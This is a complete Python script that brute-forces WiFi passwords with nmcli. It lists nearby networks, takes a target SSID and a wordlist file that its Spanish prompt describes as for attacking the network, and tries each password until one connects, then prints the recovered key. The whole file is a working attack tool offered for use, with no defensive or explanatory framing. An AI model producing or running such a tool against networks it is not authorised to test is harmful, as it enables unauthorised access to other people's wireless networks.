import subprocess
from colorama import init, Fore, Style
import os

# Inicio de colorama
init(autoreset=True)

def list_available_networks():
    try:
        result = subprocess.run(['nmcli', '-t', '-f', 'SSID', 'dev', 'wifi'], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"{Fore.RED}Failed to list available networks.")
            return []
        ssids = result.stdout.strip().split('\n')
        return [ssid for ssid in ssids if ssid]
    except Exception as e:
        print(f"{Fore.RED}Error listing networks: {e}")
        return []

def connect_to_wifi(ssid, password):
    try:
        # Disconnect from any current connection
        subprocess.run(['nmcli', 'con', 'down', ssid], capture_output=True, text=True)
        # Delete the connection if it already exists
        subprocess.run(['nmcli', 'con', 'delete', ssid], capture_output=True, text=True)
        # Add a new connection with the provided SSID and password
        result = subprocess.run(['nmcli', 'dev', 'wifi', 'con', ssid, 'password', password], capture_output=True, text=True)
        if result.returncode == 0:
            print(f"{Fore.GREEN}Connected to {ssid} successfully!")
            return True
        else:
            print(f"{Fore.RED}Failed to connect to {ssid}. Output: {result.stdout}")
            return False
    except Exception as e:
        print(f"{Fore.RED}An error occurred: {e}")
        return False

def try_passwords(ssid, password_file):
    try:
        with open(password_file, 'r', encoding='latin-1') as file:
            password_list = file.read().splitlines()
        
        for password in password_list:
            print(f"Trying password: {Fore.RED}{password}{Style.RESET_ALL}")
            if connect_to_wifi(ssid, password):
                print(f"{Fore.LIGHTGREEN_EX}Conectado exitosamente a {ssid} con contraseña: {password}")
                return password
        print(f"{Fore.RED}No pudo conectarse a {ssid} con cualquiera de las contraseñas proporcionadas.")
        return None
    except Exception as e:
        print(f"{Fore.RED}Error reading password file: {e}")
        return None

# Lista redes disponibles
available_networks = list_available_networks()
if not available_networks:
    print("No se encontraron redes disponibles.")
else:
    print("Redes disponibles:")
    for i, ssid in enumerate(available_networks, 1):
        print(f"{Fore.CYAN}{i}. {ssid}{Style.RESET_ALL}")

    # Solicita SSID hasta que se proporcione uno válido
    while True:
        ssid = input(f"{Fore.YELLOW}Inserta el nombre de la red WiFi: {Style.RESET_ALL}")
        if ssid not in available_networks:
            print(f"{Fore.RED}El nombre de la red '{ssid}' no esta en la lista de redes WiFi validas. Intenta nuevamente.{Style.RESET_ALL}")
        else:
            break

    # Solicita la ruta del archivo de contraseña hasta que se proporcione una válida
    while True:
        password_file = input(f"{Fore.YELLOW}Inserta la ruta del archivo de claves, para atacar la red: {Style.RESET_ALL}")
        if not os.path.isfile(password_file):
            print(f"{Fore.RED}La ruta '{password_file}' esta incorrecta. Intenta nuevamente.{Style.RESET_ALL}")
        else:
            break

    # Intenta conectarse usando contraseñas del archivo
    successful_password = try_passwords(ssid, password_file)
    if successful_password:
        print(f"{Fore.GREEN}Clave wifi encontrada: {successful_password}")
    else:
        print("No se pudo conectar con todas las contraseñas proporcionadas.")